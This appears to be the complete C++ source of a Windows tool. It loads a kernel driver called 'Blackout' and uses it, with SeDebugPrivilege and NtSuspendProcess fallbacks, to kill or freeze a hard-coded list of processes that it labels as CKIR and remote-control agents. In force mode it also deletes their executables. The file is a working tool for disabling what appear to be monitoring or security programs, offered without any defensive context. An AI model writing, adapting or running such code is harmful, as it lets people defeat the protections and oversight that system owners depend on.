#include "main.h"
#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>
#include <io.h>
using namespace std;
#define INITIALIZE_IOCTL_CODE 0x9876C004
#define TERMINSTE_PROCESS_IOCTL_CODE 0x9876C094

typedef long (NTAPI* pNtProcess)(HANDLE proccessHandle);
pNtProcess NtSuspendProcess;
pNtProcess NtResumeProcess;

static void Elevate() {
    HANDLE token;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);
    TOKEN_PRIVILEGES tp;
    LUID luid;
    LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid);
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    //privs.Luid.LowPart = privs.Luid.HighPart = 0;
    if (AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), NULL, NULL))
        cout << "Success Privileges.\n";
}

static bool LoadNT() {
    auto ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return false;
    NtSuspendProcess = (pNtProcess)GetProcAddress(ntdll, "NtSuspendProcess");
    NtResumeProcess = (pNtProcess)GetProcAddress(ntdll, "NtResumeProcess");
    return !!NtSuspendProcess;
}

static bool LoadDriver(const char* serviceName, char* driverPath) {
    SC_HANDLE hSCM, hService;

    // Open a handle to the SCM database
    hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCM == NULL) {
        return 0;
    }

    // Check if the service already exists
    hService = OpenServiceA(hSCM, serviceName, SERVICE_ALL_ACCESS);
    if (hService != NULL)
    {
        cout << "Service already exists.\n";

        // Start the service if it's not running
        SERVICE_STATUS serviceStatus;
        if (!QueryServiceStatus(hService, &serviceStatus))
        {
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return 0;
        }

        if (serviceStatus.dwCurrentState == SERVICE_STOPPED)
        {
            if (!StartServiceA(hService, 0, nullptr))
            {
                cout << "Could not found.\n";
                CloseServiceHandle(hService);
                CloseServiceHandle(hSCM);
                return 0;
            }

            cout << "Starting service...\n";
        }

        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return 1;
    }

    // Create the service
    hService = CreateServiceA(
        hSCM,
        serviceName,
        serviceName,
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        driverPath,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL
    );

    if (hService == NULL) {
        CloseServiceHandle(hSCM);
        return (1);
    }

    cout << "Service created successfully.\n";

    // Start the service
    if (!StartServiceA(hService, 0, nullptr))
    {
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return 0;
    }

    cout << "Starting service...\n";

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);

    return 1;
}

static bool RemoveDriver(const char* serviceName, char* driverPath) {
    SC_HANDLE hSCM, hService;

    // Open a handle to the SCM database
    hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCM == NULL) {
        return 0;
    }

    // Check if the service already exists
    hService = OpenServiceA(hSCM, serviceName, SERVICE_ALL_ACCESS);
    if (hService == NULL)
    {
        cout << "Service already deleted.\n";
        return 0;
    }
    DeleteService(hService);

    cout << "Service deleted.\n";

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);

    return 1;
}

class TerminateData {
public:
    DWORD pid;
    bool terminated;
    TerminateData(DWORD pid) :pid(pid), terminated(false) {}
};

static BOOL CALLBACK TerminateByHWND(HWND hwnd, LPARAM lParam) {
    DWORD pid;
    TerminateData* data = reinterpret_cast<TerminateData*>(lParam);
    GetWindowThreadProcessId(hwnd, &pid);
    if (pid != data->pid) return true;
    if (!ChangeWindowMessageFilterEx(hwnd, WM_CLOSE, MSGFLT_ALLOW, 0)) {
        cout << '(' << std::hex << GetLastError() << ')';
    }
    if (PostMessageA(hwnd, WM_CLOSE, NULL, NULL)) {
        data->terminated = true;
    }
    return true;
}

static bool TerminateProc(HANDLE terminateHandle, PROCESSENTRY32& procEntry, int buildType) {
    DWORD output[2] = { 0 };
    DWORD size = sizeof(output);
    DWORD byteReturned = 0;
    if (DeviceIoControl(terminateHandle, TERMINSTE_PROCESS_IOCTL_CODE, &procEntry.th32ProcessID, sizeof(procEntry.th32ProcessID), output, size, &byteReturned, NULL)) {
        return true;
    }

	DWORD dwExitCode = 0;
	auto handle = OpenProcess(PROCESS_ALL_ACCESS, true, procEntry.th32ProcessID);
	if (GetExitCodeProcess(handle, &dwExitCode)) {
		if (TerminateProcess(handle, dwExitCode)) {
			CloseHandle(handle);
			return true;
		}
	}

    if (buildType == BUILD_TYPE_FORCE) {
        TerminateData result(procEntry.th32ProcessID);
        EnumWindows(TerminateByHWND, reinterpret_cast<long long>(&result));
        if (handle != NULL) {
            TCHAR filePath[MAX_PATH] = { 0 };
            DWORD len = MAX_PATH;
            if (QueryFullProcessImageNameW(handle, NULL, filePath, &len)) {
                DeleteFileW(filePath);
                cout << '[';
                wcout << filePath;
                cout << ']';
            }
        }
        if (result.terminated) {
            if (WaitForSingleObject(handle, 300) != WAIT_OBJECT_0) {
                if (TerminateProcess(handle, dwExitCode)) {
                    CloseHandle(handle);
                    return true;
                }
            }
            else {
                CloseHandle(handle);
                return true;
            }
        }
        cout << "Force Terminate Failed(" << std::hex << GetLastError() << ")";
    }

    if (NtSuspendProcess) {
        auto result = NtSuspendProcess(handle);
        cout << result;
        if (result >= 0) {
            CloseHandle(handle);
            return true;
        }
    }

	CloseHandle(handle);
	return false;
}

static bool ResumeProc(HANDLE resumeHandle, PROCESSENTRY32& procEntry) {
    auto handle = OpenProcess(PROCESS_ALL_ACCESS, true, procEntry.th32ProcessID);

    if (NtSuspendProcess) {
        auto result = NtResumeProcess(handle);
        cout << result;
        if (result >= 0) {
            CloseHandle(handle);
            return true;
        }
    }

    CloseHandle(handle);
    return false;
}

static void Unlock(int buildType) {
    auto terminateHandle = CreateFile(L"\\\\.\\Blackout", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    /*if (terminateHandle == INVALID_HANDLE_VALUE) {
        cout << "INVALID HANDLE\n";
    }*/
	auto handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	PROCESSENTRY32 procEntry = { 0 };
	procEntry.dwSize = sizeof(PROCESSENTRY32);
	Process32First(handle, &procEntry);
	do {
		if (!wcscmp(procEntry.szExeFile, L"lqndauccd.exe") || !wcscmp(procEntry.szExeFile, L"MaestroWebSvr.exe")
			|| !wcscmp(procEntry.szExeFile, L"qukapttp.exe") || !wcscmp(procEntry.szExeFile, L"MaestroWebAgent.exe")
            || !wcscmp(procEntry.szExeFile, L"nfowjxyfd.exe")) {
			cout << "Latest CKIR process ["; wcout << procEntry.szExeFile; cout << "] ";
			if (buildType == BUILD_TYPE_RESUME && ResumeProc(terminateHandle, procEntry)) cout << "RESUME\n";
            else if (TerminateProc(terminateHandle, procEntry, buildType)) cout << "KILLED\n";
			else cout << "KILL failed\n";
			continue;
		}
		if (!wcscmp(procEntry.szExeFile, L"TDepend64.exe") || !wcscmp(procEntry.szExeFile, L"TDepend.exe")) {
			cout << "Remote control process ["; wcout << procEntry.szExeFile; cout << "] ";
            if (buildType == BUILD_TYPE_RESUME && ResumeProc(terminateHandle, procEntry)) cout << "RESUME\n";
            else if (TerminateProc(terminateHandle, procEntry, buildType)) cout << "KILLED\n";
			else cout << "KILL failed\n";
			continue;
		}
		if (!wcscmp(procEntry.szExeFile, L"rwtyijsa.exe") || !wcscmp(procEntry.szExeFile, L"nhfneczzm.exe")) {
			cout << "Unknown process ["; wcout << procEntry.szExeFile; cout << "] ";
            if (buildType == BUILD_TYPE_RESUME && ResumeProc(terminateHandle, procEntry)) cout << "RESUME\n";
            else if (TerminateProc(terminateHandle, procEntry, buildType)) cout << "KILLED\n";
			else cout << "KILL failed\n";
			continue;
		}
		if (!wcscmp(procEntry.szExeFile, L"SoluSpSvr.exe") || !wcscmp(procEntry.szExeFile, L"MaestroNAgent.exe")
			|| !wcscmp(procEntry.szExeFile, L"MaestroNSvr.exe")) {
			cout << "Legacy CKIR process ["; wcout << procEntry.szExeFile; cout << "] ";
            if (buildType == BUILD_TYPE_RESUME && ResumeProc(terminateHandle, procEntry)) cout << "RESUME\n";
            else if (TerminateProc(terminateHandle, procEntry, buildType)) cout << "KILLED\n";
			else cout << "KILL failed\n";
			continue;
		}
	} while (Process32Next(handle, &procEntry));
	CloseHandle(handle);
    CloseHandle(terminateHandle);
}

void run(int buildType) {
    cin.tie(0), cout.tie(0)->sync_with_stdio(0);
    wcin.tie(0), wcout.tie(0)->sync_with_stdio(0);
    Elevate();

    WIN32_FIND_DATAA file;
    char driverPath[MAX_PATH];
    if (FindFirstFileA("Blackout.sys", &file) != INVALID_HANDLE_VALUE) {
        if (GetFullPathNameA(file.cFileName, MAX_PATH, driverPath, NULL) != 0) {
            cout << "Driver found.\n";
        }
        else
            cout << "Find Driver Failed\n";
    }
    else
        cout << "Find Driver Failed\n";

    if (!LoadDriver("Blackout", driverPath))
        cout << "Faild to load driver ,try to run the program as administrator!!\n";

    if (LoadNT())
        cout << "NT Loaded\n";
    else
        cout << "NT Load Failed..\n";

	Unlock(buildType);
    end:
    if (!RemoveDriver("Blackout", driverPath)) {
        cout << "Service delete failed.\n";
    }
	cout << "\n\nPress Enter to exit...";
    system("pause");
	getchar();
}